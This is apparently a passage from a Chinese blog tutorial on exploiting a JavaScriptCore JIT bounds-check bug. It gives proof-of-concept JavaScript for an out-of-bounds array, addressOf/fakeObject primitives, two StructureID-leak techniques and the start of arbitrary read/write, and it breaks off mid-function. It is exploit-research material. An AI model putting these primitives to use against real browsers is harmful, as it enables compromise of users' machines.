<h3 id="OOB数组构造"><a href="#OOB数组构造" class="headerlink" title="OOB数组构造"></a>OOB数组构造</h3><p>利用边界检查消除来进行数组的溢出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function foo(arr,n) &#123;</span><br><span class="line">   if (n &lt; 0) &#123;</span><br><span class="line">      let a = -n;</span><br><span class="line">      let idx = Math.abs(n);</span><br><span class="line">      if (idx &lt; arr.length) &#123; //确定在边界之内</span><br><span class="line">         if (idx &amp; 0x80000000) &#123; //对于0x80000000，我们减去一个数,以将idx变换到任意正值</span><br><span class="line">            idx += -0x7ffffffd;</span><br><span class="line">         &#125;</span><br><span class="line">         if (idx &gt;= 0) &#123; //确定在边界之内</span><br><span class="line">            return arr[idx]; //溢出</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr = [1.1,2.2,3.3];</span><br><span class="line">for (var i=0;i&lt;0xc0000;i++) &#123;</span><br><span class="line">   foo(arr,-2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">debug(foo(arr,-0x80000000));</span><br></pre></td></tr></table></figure>
<p>因为编译器的错误优化，idx是一个32位数，那么<code>idx &lt; arr.length</code>的检查通过，那么后续的<code>return arr[idx]; //溢出</code>将不会检查右边界，因此可以溢出数据。通过测试，发现POC有时可以成功溢出，有时不能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js</span><br><span class="line">--&gt; 1.5488838078e-314</span><br><span class="line">root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js</span><br><span class="line">--&gt; undefined</span><br></pre></td></tr></table></figure>
<p>这是因为漏洞最终发生在<code>FTL JIT</code>，这个是延迟优化的，可能在执行最后的<code>debug(foo(arr,-0x80000000));</code>还没生成好JIT代码，因此具有微小的随机性，不影响漏洞利用。为了查看FTL JIT的汇编代码，我们使用前面介绍的方法，对arr的<code>butterfly</code>下硬件断点，然后停下时将代码片段dump出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">seg000:00007FFFAF10346F                 mov     ecx, eax</span><br><span class="line">seg000:00007FFFAF103471                 neg     ecx</span><br><span class="line">seg000:00007FFFAF103473                 mov     rdx, [rdx+8]</span><br><span class="line">seg000:00007FFFAF103477                 cmp     ecx, [rdx-8]</span><br><span class="line">seg000:00007FFFAF10347A                 jl      loc_7FFFAF103496</span><br><span class="line">seg000:00007FFFAF103480                 mov     dword ptr [rsi+737C1Ch], 1</span><br><span class="line">seg000:00007FFFAF10348A                 mov     rax, 0Ah</span><br><span class="line">seg000:00007FFFAF103491                 mov     rsp, rbp</span><br><span class="line">seg000:00007FFFAF103494                 pop     rbp</span><br><span class="line">seg000:00007FFFAF103495                 retn</span><br><span class="line">seg000:00007FFFAF103496 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:00007FFFAF103496</span><br><span class="line">seg000:00007FFFAF103496 loc_7FFFAF103496:                       ; CODE XREF: seg000:00007FFFAF10347A↑j</span><br><span class="line">seg000:00007FFFAF103496                 test    ecx, 80000000h</span><br><span class="line">seg000:00007FFFAF10349C                 jnz     loc_7FFFAF1034E8</span><br><span class="line">seg000:00007FFFAF1034A2                 test    ecx, ecx</span><br><span class="line">seg000:00007FFFAF1034A4                 jns     loc_7FFFAF1034C0</span><br><span class="line">................</span><br><span class="line">seg000:00007FFFAF1034E8 loc_7FFFAF1034E8:                       ; CODE XREF: seg000:00007FFFAF10349C↑j</span><br><span class="line">seg000:00007FFFAF1034E8                 mov     rcx, 0FFFFFFFF80000003h</span><br><span class="line">seg000:00007FFFAF1034EF                 sub     ecx, eax</span><br><span class="line">seg000:00007FFFAF1034F1                 test    ecx, ecx</span><br><span class="line">seg000:00007FFFAF1034F3                 jns     loc_7FFFAF1034C0</span><br><span class="line">seg000:00007FFFAF1034F9                 jmp     loc_7FFFAF1034AA</span><br><span class="line">................</span><br><span class="line">seg000:00007FFFAF1034C0 loc_7FFFAF1034C0:                       ; CODE XREF: seg000:00007FFFAF1034A4↑j</span><br><span class="line">seg000:00007FFFAF1034C0                                         ; seg000:00007FFFAF1034F3↓j</span><br><span class="line">seg000:00007FFFAF1034C0                 mov     eax, ecx</span><br><span class="line">seg000:00007FFFAF1034C2                 movsd   xmm0, qword ptr [rdx+rax*8]</span><br><span class="line">seg000:00007FFFAF1034C7                 ucomisd xmm0, xmm0</span><br><span class="line">seg000:00007FFFAF1034CB                 jp      loc_7FFFAF1035A8</span><br><span class="line">seg000:00007FFFAF1034D1                 movq    rax, xmm0</span><br><span class="line">seg000:00007FFFAF1034D6                 sub     rax, rdi</span><br><span class="line">seg000:00007FFFAF1034D9                 mov     dword ptr [rsi+737C1Ch], 1</span><br><span class="line">seg000:00007FFFAF1034E3                 mov     rsp, rbp</span><br><span class="line">seg000:00007FFFAF1034E6                 pop     rbp</span><br><span class="line">seg000:00007FFFAF1034E7                 retn</span><br></pre></td></tr></table></figure>
<p>从中可以看出，上述汇编代码正好印证了我们前面的分析，<code>neg     ecx</code>代表了<code>Math.abs()</code>，然后<code>cmp     ecx, [rdx-8]</code>比较右边界，但由于ecx是32位，0x80000000比较通过，然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seg000:00007FFFAF1034E8                 mov     rcx, 0FFFFFFFF80000003h</span><br><span class="line">seg000:00007FFFAF1034EF                 sub     ecx, eax</span><br></pre></td></tr></table></figure>
<p>使得ecx为3，最后通过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seg000:00007FFFAF1034C0                 mov     eax, ecx</span><br><span class="line">seg000:00007FFFAF1034C2                 movsd   xmm0, qword ptr [rdx+rax*8]</span><br></pre></td></tr></table></figure>
<p>进行数组溢出读取数据。那么我们可以用同样的方法，越界写改写下一个数组对象<code>butterfly</code>中的<code>length</code>和<code>capacity</code>，从而构造一个oob的数组对象。首先要在内存上布局三个相邻的数组对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr0 ArrayWithDouble,</span><br><span class="line">arr1 ArrayWithDouble,</span><br><span class="line">arr2 ArrayWithContiguous,</span><br></pre></td></tr></table></figure>
<p>通过arr0溢出改写arr1的<code>length</code>和<code>capacity</code>，即可将arr1构造为oob的数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var arr = [1.1,2.2,3.3];</span><br><span class="line">var oob_arr= [2.2,3.3,4.4];</span><br><span class="line">var obj_arr = [&#123;&#125;,&#123;&#125;,&#123;&#125;];</span><br><span class="line"></span><br><span class="line">debug(describe(arr));</span><br><span class="line">debug(describe(oob_arr));</span><br><span class="line">debug(describe(obj_arr));</span><br><span class="line">print();</span><br></pre></td></tr></table></figure>
<p>发现三个数组的<code>butterfly</code>不相邻，并且类型不大对</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--&gt; Object: 0x7fffef1a83e8 with butterfly 0x7fe00cee4010 (Structure 0x7fffae7f99e0:[0xee79, Array, &#123;&#125;, CopyOnWriteArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 61049</span><br><span class="line">--&gt; Object: 0x7fffef1a8468 with butterfly 0x7fe00cee4040 (Structure 0x7fffae7f99e0:[0xee79, Array, &#123;&#125;, CopyOnWriteArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 61049</span><br><span class="line">--&gt; Object: 0x7fffef1a84e8 with butterfly 0x7fe00cefda48 (Structure 0x7fffae7f9860:[0xe077, Array, &#123;&#125;, ArrayWithContiguous, Proto:0x7fffef1bc2e8]), StructureID: 57463</span><br></pre></td></tr></table></figure>
<p>前两个类型为<code>CopyOnWriteArrayWithDouble</code>，导致它们与arr2的<code>butterfly </code>不相邻，于是尝试这样构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let noCow = 13.37;</span><br><span class="line">var arr = [noCow,2.2,3.3];</span><br><span class="line">var oob_arr = [noCow,2.2,3.3];</span><br><span class="line">var obj_arr = [&#123;&#125;,&#123;&#125;,&#123;&#125;];</span><br><span class="line"></span><br><span class="line">debug(describe(arr));</span><br><span class="line">debug(describe(oob_arr));</span><br><span class="line">debug(describe(obj_arr));</span><br><span class="line">print();</span><br><span class="line">--&gt; Object: 0x7fffef1a6168 with butterfly 0x7fe01e4fda48 (Structure 0x7fffae7f9800:[0xcd04, Array, &#123;&#125;, ArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 52484</span><br><span class="line">--&gt; Object: 0x7fffef1a61e8 with butterfly 0x7fe01e4fda68 (Structure 0x7fffae7f9800:[0xcd04, Array, &#123;&#125;, ArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 52484</span><br><span class="line">--&gt; Object: 0x7fffef1a6268 with butterfly 0x7fe01e4fda88 (Structure 0x7fffae7f9860:[0x5994, Array, &#123;&#125;, ArrayWithContiguous, Proto:0x7fffef1bc2e8]), StructureID: 22932</span><br></pre></td></tr></table></figure>
<p>这回就相邻了，然后我们利用前面的漏洞构造oob数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function foo(arr,n) &#123;</span><br><span class="line">   if (n &lt; 0) &#123;</span><br><span class="line">      let a = -n;</span><br><span class="line">      let idx = Math.abs(n);</span><br><span class="line">      if (idx &lt; arr.length) &#123; //确定在边界之内</span><br><span class="line">         if (idx &amp; 0x80000000) &#123; //对于0x80000000，我们减去一个数,以将idx变换到任意正值</span><br><span class="line">            idx += -0x7ffffffd;</span><br><span class="line">         &#125;</span><br><span class="line">         if (idx &gt;= 0) &#123; //确定在边界之内</span><br><span class="line">            arr[idx] = 1.04380972981885e-310; //溢出</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let noCow = 13.37;</span><br><span class="line">var arr = [noCow,2.2,3.3];</span><br><span class="line">var oob_arr = [noCow,2.2,3.3];</span><br><span class="line">var obj_arr = [&#123;&#125;,&#123;&#125;,&#123;&#125;];</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0xc0000;i++) &#123;</span><br><span class="line">   foo(arr,-2);</span><br><span class="line">&#125;</span><br><span class="line">foo(arr,-0x80000000);</span><br><span class="line"></span><br><span class="line">debug(oob_arr.length);</span><br></pre></td></tr></table></figure>
<p>输出如下，需要多次尝试，原因前面说过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js</span><br><span class="line">--&gt; 3</span><br><span class="line">root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js</span><br><span class="line">--&gt; 3</span><br><span class="line">root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js</span><br><span class="line">--&gt; 3</span><br><span class="line">root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js</span><br><span class="line">--&gt; 4919</span><br></pre></td></tr></table></figure>
<p>利用oob_arr和obj_arr即可轻松构造出addressOf和fakeObject原语</p>
<h3 id="泄露StructureID"><a href="#泄露StructureID" class="headerlink" title="泄露StructureID"></a>泄露StructureID</h3><h4 id="getByVal"><a href="#getByVal" class="headerlink" title="getByVal"></a>getByVal</h4><p>在新版的JSC中，加入了StructureID随机化机制，使得我们前面介绍的喷射对象，并猜测StructureID的方法变得困难，成功率极大降低。因此需要使用其他方法，一种方法是利用<code>getByVal</code>，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static ALWAYS_INLINE JSValue getByVal(VM&amp; vm, JSGlobalObject* globalObject, CodeBlock* codeBlock, JSValue baseValue, JSValue subscript, OpGetByVal bytecode)</span><br><span class="line">&#123;</span><br><span class="line">   ..............................</span><br><span class="line">    if (subscript.isUInt32()) &#123;</span><br><span class="line">       .......................</span><br><span class="line">        &#125; else if (baseValue.isObject()) &#123;</span><br><span class="line">            JSObject* object = asObject(baseValue);</span><br><span class="line">            if (object-&gt;canGetIndexQuickly(i))</span><br><span class="line">                return object-&gt;getIndexQuickly(i);</span><br></pre></td></tr></table></figure>
<p>其中<code>canGetIndexQuickly</code>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    bool canGetIndexQuickly(unsigned i) const</span><br><span class="line">    &#123;</span><br><span class="line">        const Butterfly* butterfly = this-&gt;butterfly();</span><br><span class="line">        switch (indexingType()) &#123;</span><br><span class="line">...............</span><br><span class="line">        case ALL_DOUBLE_INDEXING_TYPES: &#123;</span><br><span class="line">            if (i &gt;= butterfly-&gt;vectorLength())</span><br><span class="line">                return false;</span><br><span class="line">            double value = butterfly-&gt;contiguousDouble().at(this, i);</span><br><span class="line">            if (value != value)</span><br><span class="line">                return false;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">............</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>getIndexQuickly代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    JSValue getIndexQuickly(unsigned i) const</span><br><span class="line">    &#123;</span><br><span class="line">.............</span><br><span class="line">        case ALL_DOUBLE_INDEXING_TYPES:</span><br><span class="line">            return JSValue(JSValue::EncodeAsDouble, butterfly-&gt;contiguousDouble().at(this, i));</span><br><span class="line">...............</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>从上面可以知道<code>getIndexQuickly</code>这条路径不会使用到StructureID，那么如何触发<code>getByVal</code>呢？经过测试，发现对<code>不是数组类型</code>的对象，使用<code>[]</code>运算符可以触发到<code>getByVal</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a = &#123;x:1&#125;;</span><br><span class="line">var b = a[0];</span><br><span class="line">debug(b);</span><br><span class="line">print();</span><br></pre></td></tr></table></figure>
<p>因此，我们可以尝试构造一个假的StructureID，使得它匹配StructureID时发现不是数组类型，就可以调用到<code>getByVal</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var arr_leak = new Array(noCow,2.2,3.3);</span><br><span class="line">function leak_structureID(obj) &#123;</span><br><span class="line">   let jscell_double = p64f(0x00000000,0x01062307);</span><br><span class="line">   let container = &#123;</span><br><span class="line">      jscell:jscell_double,</span><br><span class="line">      butterfly:obj</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   let container_addr = addressOf(container);</span><br><span class="line">   let hax = fakeObject(container_addr[0]+0x10,container_addr[1]);</span><br><span class="line">   f64[0] = hax[0];</span><br><span class="line">   let structureID = u32[0];</span><br><span class="line">   //修复JSCell</span><br><span class="line">   u32[1] = 0x01082307 - 0x20000;</span><br><span class="line">   container.jscell = f64[0];;</span><br><span class="line">   return structureID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var structureID = leak_structureID(arr_leak);</span><br><span class="line">debug(structureID);</span><br><span class="line">print();</span><br></pre></td></tr></table></figure>
<p>调试如下<br>baseValue.isObject()判断通过，将进入分支</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> ► 962         &#125; else if (baseValue.isObject()) &#123;</span><br><span class="line">   963             JSObject* object = asObject(baseValue);</span><br><span class="line">   964             if (object-&gt;canGetIndexQuickly(i))</span><br><span class="line">   965                 return object-&gt;getIndexQuickly(i);</span><br><span class="line">   966 </span><br><span class="line">   967             bool skipMarkingOutOfBounds = false;</span><br><span class="line">pwndbg&gt; p baseValue.isObject()</span><br><span class="line">$3 = true</span><br></pre></td></tr></table></figure>
<p>接下来，我们跟踪进入<code>canGetIndexQuickly</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/WebKit/Source/JavaScriptCore/runtime/JSObject.h</span><br><span class="line">   272             return false;</span><br><span class="line">   273         case ALL_INT32_INDEXING_TYPES:</span><br><span class="line">   274         case ALL_CONTIGUOUS_INDEXING_TYPES:</span><br><span class="line">   275             return i &lt; butterfly-&gt;vectorLength() &amp;&amp; butterfly-&gt;contiguous().at(this, i);</span><br><span class="line">   276         case ALL_DOUBLE_INDEXING_TYPES: &#123;</span><br><span class="line"> ► 277             if (i &gt;= butterfly-&gt;vectorLength())</span><br><span class="line">   278                 return false;</span><br><span class="line">   279             double value = butterfly-&gt;contiguousDouble().at(this, i);</span><br><span class="line">   280             if (value != value)</span><br><span class="line">   281                 return false;</span><br><span class="line">   282             return true;</span><br><span class="line">pwndbg&gt; p butterfly-&gt;vectorLength()</span><br><span class="line">$11 = 32767</span><br></pre></td></tr></table></figure>
<p>这里获取了容量，如果i在长度范围之内，则返回true，即可成功取得数据。由于这里我们是将<code>arr_leak</code>这个对象当成了<code>butterfly</code>，因此容量也就是&amp;arr_leak-0x4处的数据，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /2wx 0x7fffef1613e8-0x8</span><br><span class="line">0x7fffef1613e0:	0xef1561a0	0x00007fff</span><br></pre></td></tr></table></figure>
<p>与32767对应上了。由此我们看出，这种方法的条件是<code>&amp;arr_leak-0x4处的数据要大于0即可</code>，因此可以在内存布局的时候在<code>arr_leak</code>前面布置一个数组并用数据填充。如果不在前面布局一个数组用于填充，则利用程序将受到随机化的影响而不稳定。</p>
<h4 id="Function-prototype-toString-call"><a href="#Function-prototype-toString-call" class="headerlink" title="Function.prototype.toString.call"></a>Function.prototype.toString.call</h4><p>另一个方法是通过toString() 函数的调用链来实现任意地址读数据，主要就是伪造调用链中的结构，最终使得<code>identifier</code>指向需要泄露的地址处，然后使用<code>Function.prototype.toString.call</code>获得任意地址处的数据，可参考<a target="_blank" rel="noopener" href="https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf">文章</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">function leak_structureID2(obj) &#123;</span><br><span class="line">    // https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf</span><br><span class="line"></span><br><span class="line">    var unlinkedFunctionExecutable = &#123;</span><br><span class="line">        m_isBuitinFunction: i2f(0xdeadbeef),</span><br><span class="line">        pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,</span><br><span class="line">        m_identifier: &#123;&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    var fakeFunctionExecutable = &#123;</span><br><span class="line">      pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,</span><br><span class="line">      m_executable: unlinkedFunctionExecutable,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    var container = &#123;</span><br><span class="line">      jscell: i2f(0x00001a0000000000),</span><br><span class="line">      butterfly: &#123;&#125;,</span><br><span class="line">      pad: 0,</span><br><span class="line">      m_functionExecutable: fakeFunctionExecutable,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    let fakeObjAddr = addressOf(container);</span><br><span class="line">    let fakeObj = fakeObject(fakeObjAddr[0] + 0x10,fakeObjAddr[1]);</span><br><span class="line"></span><br><span class="line">    unlinkedFunctionExecutable.m_identifier = fakeObj;</span><br><span class="line">    container.butterfly = obj;</span><br><span class="line"></span><br><span class="line">    var nameStr = Function.prototype.toString.call(fakeObj);</span><br><span class="line"></span><br><span class="line">    let structureID = nameStr.charCodeAt(9);</span><br><span class="line"></span><br><span class="line">    // repair the fakeObj&#x27;s jscell</span><br><span class="line">    u32[0] = structureID;</span><br><span class="line">    u32[1] = 0x01082309-0x20000;</span><br><span class="line">    container.jscell = f64[0];</span><br><span class="line">    return structureID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="任意地址读写原语"><a href="#任意地址读写原语" class="headerlink" title="任意地址读写原语"></a>任意地址读写原语</h3><p>在泄露了StructureID以后，就可以伪造数组对象进行任意地址读写了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">var structureID = leak_structureID2(arr_leak);</span><br><span class="line">u32[0] = structureID;</span><br><span class="line">u32[1] = 0x01082309-0x20000;</span><br><span class="line"></span><br><span class="line">//debug(describe(arr_leak));</span><br><span class="line">debug(&#x27;[+] structureID=&#x27; + structureID);</span><br><span class="line"></span><br><span class="line">var victim = [1.1,2.2,3.3];</span><br><span class="line">victim[&#x27;prop&#x27;] = 23.33;</span><br><span class="line"></span><br><span class="line">var container = &#123;</span><br><span class="line">   jscell:f64[0],</span><br><span class="line">   butterfly:victim</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var container_addr = addressOf(container);</span><br><span class="line">var hax = fakeObject(container_addr[0]+0x10,container_addr[1]);</span><br><span class="line"></span><br><span class="line">var padding = [1.1,2.2,3.3,4.4];</span><br><span class="line">var unboxed = [noCow,2.2,3.3];</span><br><span class="line">var boxed = [&#123;&#125;];</span><br><span class="line"></span><br><span class="line">/*debug(describe(unboxed));</span><br><span class="line">debug(describe(boxed));</span><br><span class="line">debug(describe(victim));</span><br><span class="line">debug(describe(hax));</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">hax[1] = unboxed;</span><br><span class="line">var sharedButterfly = victim[1];</span><br><span class="line">hax[1] = boxed;</span><br><span class="line">victim[1] = sharedButterfly;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function NewAddressOf(obj) &#123;</span><br><span class="line">   boxed[0] = obj;</span><br><span class="line">   return u64f(unboxed[0]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function NewFakeObject(addr_l,addr_h) &#123;</span><br><span class="line">   var addr = p64f(addr_l,addr_h);</span><br><span class="line">   unboxed[0] = addr;</span><br><span class="line">   return boxed[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read64(addr_l,addr_h) &#123;</span><br><span class="line">   //必须保证在vicim[-1]处有数据，即used slots和max slots字段，否则将导致读取失败</span><br><span class="line">   //因此我们换用另一种方法，即利用property去访问</span><br><span class="line">   hax[1] = NewFakeObject(addr_l + 0x10,addr_h);</span><br><span class="line">   return 